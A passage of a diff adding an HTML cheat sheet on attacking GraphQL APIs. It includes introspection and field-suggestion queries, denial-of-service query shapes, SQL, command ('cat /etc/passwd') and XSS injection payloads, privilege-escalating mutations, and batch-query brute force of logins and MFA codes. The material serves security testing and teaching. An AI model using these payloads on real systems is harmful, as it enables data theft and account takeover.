+</span></span></code></pre></div></li>
+<li>
+<p><strong>Directives</strong>: starts with <code>@</code>symbol, used to conditionally include fields, apply transformations, or provide metadata</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">query</span> <span style="color:#a6e22e">GetUsers</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">users</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">username</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">email</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isAdmin</span> <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">include</span>(<span style="color:#66d9ef">if</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Subscriptions</strong>: allows clients to receive real-time updates from the server</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">subscription</span> <span style="color:#a6e22e">NewPosts</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">newPost</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">title</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">content</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+</ol>
+<hr>
+<h3 id="finding-graphql-endpoints">
+  Finding GraphQL Endpoints
+  <a class="anchor" href="#finding-graphql-endpoints">#</a>
+</h3>
+<ul>
+<li>Analyze the requests in proxy tool (Burp Suite)
+<ul>
+<li>To check if a URL is a GraphQL service:
+<ul>
+<li>send a <strong>universal query:</strong> <code>query{__typename}</code></li>
+<li>If the response includes <code>{&quot;data&quot;: {&quot;__typename&quot;: &quot;Query&quot;}}</code>, it confirms the URL hosts a GraphQL endpoint.</li>
+</ul>
+</li>
+<li>Test for <strong>GET</strong> method: <code>?query=query%3Dquery%7B__typename%7D</code></li>
+<li>Test for <strong>POST</strong> Content-Type:
+<ul>
+<li>application/x-www-form-urlencoded</li>
+<li>multipart/form-data</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Common Endpoints:
+<ul>
+<li><code>/graphql</code></li>
+<li><code>/graphiql</code></li>
+<li><code>/graphql.php</code></li>
+<li><code>/graphql/console</code></li>
+<li><code>/api</code></li>
+<li><code>/api/graphql</code></li>
+<li><code>/graphql/api</code></li>
+<li><code>/graphql/graphql</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="attack-surfaces">
+  Attack Surfaces
+  <a class="anchor" href="#attack-surfaces">#</a>
+</h2>
+<ul>
+<li>Login Forms</li>
+<li>Sign-up Forms</li>
+<li>Update Profile</li>
+<li>Reset Password</li>
+<li>Search and Filter Arguments</li>
+<li>File Uploads</li>
+</ul>
+<hr>
+<h2 id="exploiting-graphql-vulnerabilities">
+  Exploiting GraphQL Vulnerabilities
+  <a class="anchor" href="#exploiting-graphql-vulnerabilities">#</a>
+</h2>
+<h3 id="1-information-disclosure-attacks">
+  1. Information Disclosure Attacks
+  <a class="anchor" href="#1-information-disclosure-attacks">#</a>
+</h3>
+<p><strong>1.1 Introspection Attack</strong></p>
+<p>Basic Introspection Query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__schema</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">types</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">description</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Full Introspection Query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">query</span> <span style="color:#a6e22e">IntrospectionQuery</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__schema</span> {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">queryType</span> { <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">kind</span> }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mutationType</span> { <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">kind</span> }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">subscriptionType</span> { <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">kind</span> }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">types</span> {
+</span></span><span style="display:flex;"><span>          ...<span style="color:#a6e22e">FullType</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">directives</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">description</span>
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">locations</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">args</span> {
+</span></span><span style="display:flex;"><span>            ...<span style="color:#a6e22e">InputValue</span>
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fragment</span> <span style="color:#a6e22e">FullType</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">__Type</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">description</span>
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fields</span>(<span style="color:#a6e22e">includeDeprecated</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">description</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">args</span> {
+</span></span><span style="display:flex;"><span>          ...<span style="color:#a6e22e">InputValue</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">type</span> {
+</span></span><span style="display:flex;"><span>          ...<span style="color:#a6e22e">TypeRef</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">isDeprecated</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">deprecationReason</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">inputFields</span> {
+</span></span><span style="display:flex;"><span>        ...<span style="color:#a6e22e">InputValue</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">interfaces</span> {
+</span></span><span style="display:flex;"><span>        ...<span style="color:#a6e22e">TypeRef</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">enumValues</span>(<span style="color:#a6e22e">includeDeprecated</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">description</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">isDeprecated</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">deprecationReason</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">possibleTypes</span> {
+</span></span><span style="display:flex;"><span>        ...<span style="color:#a6e22e">TypeRef</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fragment</span> <span style="color:#a6e22e">InputValue</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">__InputValue</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">description</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">type</span> { ...<span style="color:#a6e22e">TypeRef</span> }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">defaultValue</span>
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fragment</span> <span style="color:#a6e22e">TypeRef</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">__Type</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">ofType</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">kind</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>                      }
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                  }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>              }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><strong>1.2 GraphiQL Interface Attack</strong></p>
+<p>A <strong>GraphiQL Interface Attack</strong> refers to abusing an exposed <strong>GraphiQL</strong> interface—the in-browser IDE for interacting with GraphQL APIs—to gather information, execute unauthorized queries, or exploit misconfigurations</p>
+<p><strong>Common Endpoints:</strong></p>
+<ul>
+<li><strong><code>/graphiql</code></strong></li>
+<li><strong><code>/playground</code></strong></li>
+<li><strong><code>/v1/graphql</code></strong></li>
+<li><strong><code>/v2/graphql</code></strong></li>
+<li><strong><code>/console</code></strong></li>
+</ul>
+<p><strong>1.3 GraphQL Field Suggestions Attack</strong></p>
+<p>Supplying incorrect fields will trigger GraphQL to disclose fields with similar names.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Request</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Response</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;errors&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;message&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Cannot query field \&#34;system\&#34; on type \&#34;Query\&#34;. Did you mean \&#34;pastes\&#34;, \&#34;paste\&#34;, \&#34;systemUpdate\&#34; or \&#34;systemHealth\&#34;?&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;locations&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;line&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;column&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      ]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="2-denial-of-service-attacks">
+  2. Denial of Service Attacks
+  <a class="anchor" href="#2-denial-of-service-attacks">#</a>
+</h3>
+<p><strong>2.1 Batching Query Attack:</strong></p>
+<p>An attacker bundles thousands of requests into a single JSON array.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  { <span style="color:#e6db74">&#34;query&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;query { user(id: 1) { username } }&#34;</span> },
+</span></span><span style="display:flex;"><span>  { <span style="color:#e6db74">&#34;query&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;query { user(id: 2) { username } }&#34;</span> },
+</span></span><span style="display:flex;"><span>  { <span style="color:#e6db74">&#34;query&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;query { user(id: 3) { username } }&#34;</span> }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p><strong>2.2 Alias-Based Attack / Single-Query Attack:</strong></p>
+<p>An attacker duplicates the same field hundreds of times using unique labels.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">user1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>) { <span style="color:#a6e22e">username</span> }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">user2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>) { <span style="color:#a6e22e">username</span> }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">user3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>) { <span style="color:#a6e22e">username</span> }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>2.3 Deep Query Attack:</strong></p>
+<p>An attacker builds a circular query where Types references each other.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">author</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">books</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">author</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">books</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">author</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">books</span> {
+</span></span><span style="display:flex;"><span>              <span style="color:#960050;background-color:#1e0010">#</span> ... <span style="color:#a6e22e">repeated</span> <span style="color:#a6e22e">hundreds</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">times</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">title</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>2.4 Field Duplication Attack:</strong></p>
+<p>An attacker exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple times in a single query.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;query&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;query { query_4f4722ea: test_table_aggregated { max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  }  } }&#39;</span>}
+</span></span></code></pre></div><h3 id="3-generic-injection-attacks">
+  3. Generic Injection Attacks
+  <a class="anchor" href="#3-generic-injection-attacks">#</a>
+</h3>
+<p><strong>3.1 SQL Injection</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">product</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1 OR 1=1&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">price</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>3.2 Command Injection</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">mutation</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">generateBackup</span>(<span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;backup.zip; cat /etc/passwd&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>3.3 Cross-Site Scripting (XSS)</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">mutation</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">createComment</span>(<span style="color:#a6e22e">content</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="4-data-exposure-attacks">
+  4. Data Exposure Attacks
+  <a class="anchor" href="#4-data-exposure-attacks">#</a>
+</h3>
+<p><strong>4.1 Excessive Data Exposure</strong></p>
+<p>Attackers can request and retrieve sensitive data if the API exposes it, as GraphQL allows clients to specify the data they want.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">user</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">email</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">password</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">role</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>4.2 Excessive Data Exposure via Mutation Responses</strong></p>
+<p>Occurs when the mutation&rsquo;s response returns more sensitive information than intended.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">mutation</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">updateUser</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;123&#34;</span>, <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Hacked&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">email</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">passwordHash</span>     <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Leaked</span><span style="color:#f92672">!</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">apiKey</span>           <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Sensitive</span> <span style="color:#a6e22e">token</span> <span style="color:#a6e22e">exposed</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="5-over-posting-and-under-posting">
+  5. Over-Posting and Under-Posting
+  <a class="anchor" href="#5-over-posting-and-under-posting">#</a>
+</h3>
+<ul>
+<li>
+<p><strong>Over-Posting:</strong> Attackers send unexpected fields in a mutation to update unauthorized data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">mutation</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">updateUser</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;123&#34;</span>, <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Under-Posting:</strong> Attackers exploit incomplete input validation, leading to unexpected behavior.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">mutation</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">deleteUser</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;789&#34;</span>) {  <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Missing</span> <span style="color:#a6e22e">confirm</span> <span style="color:#a6e22e">field</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+</ul>
+<hr>
+<h2 id="bypasses">
+  Bypasses
+  <a class="anchor" href="#bypasses">#</a>
+</h2>
+<ul>
+<li>
+<p>Use a newline to bypass regex-based introspection blocking because GraphQL ignores spaces, newlines, and comma</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;query&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;query{__schema
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  {queryType{name}}}&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+</ul>
+<hr>
+<h2 id="advanced-attack-scenarios">
+  Advanced Attack Scenarios
+  <a class="anchor" href="#advanced-attack-scenarios">#</a>
+</h2>
+<h3 id="1-login-brute-force-using-batch-query-attack">
+  1. Login Brute-force using Batch Query Attack
+  <a class="anchor" href="#1-login-brute-force-using-batch-query-attack">#</a>
+</h3>
+<p>A standard brute-force attack would send thousands of POST requests to <code>/graphql</code>. A batching attack sends one request with 1,000 login attempts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  { <span style="color:#e6db74">&#34;query&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;mutation { login(user: \&#34;admin\&#34;, pass: \&#34;123456\&#34;) { token } }&#34;</span> },
+</span></span><span style="display:flex;"><span>  { <span style="color:#e6db74">&#34;query&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;mutation { login(user: \&#34;admin\&#34;, pass: \&#34;password\&#34;) { token } }&#34;</span> },
+</span></span><span style="display:flex;"><span>  { <span style="color:#e6db74">&#34;query&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;mutation { login(user: \&#34;admin\&#34;, pass: \&#34;qwerty\&#34;) { token } }&#34;</span> }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>If the server returns a token for the second object but an error for the others, the attacker has successfully compromised the account in a single HTTP request.</p>
+<h3 id="2-bypassing-mfa-using-batch-query-attack">
+  2. Bypassing MFA using Batch Query Attack
+  <a class="anchor" href="#2-bypassing-mfa-using-batch-query-attack">#</a>
+</h3>
+<p>If an application requires a 6-digit OTP code, there are 1,000,000 possible combinations. By using batching, an attacker can send batches of 1,000 codes per request only needing 1,000 HTTP requests to exhaust the entire keyspace.</p>
+<h3 id="3-idor">
+  3. IDOR
+  <a class="anchor" href="#3-idor">#</a>
+</h3>
+<p>GraphQL APIs frequently use object identifiers (such as <code>id</code>, <code>userId</code>, or <code>orderId</code>) to fetch resources. If proper authorization checks are not implemented in the resolver, an attacker can manipulate these identifiers to access data belonging to other users.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">query</span> {
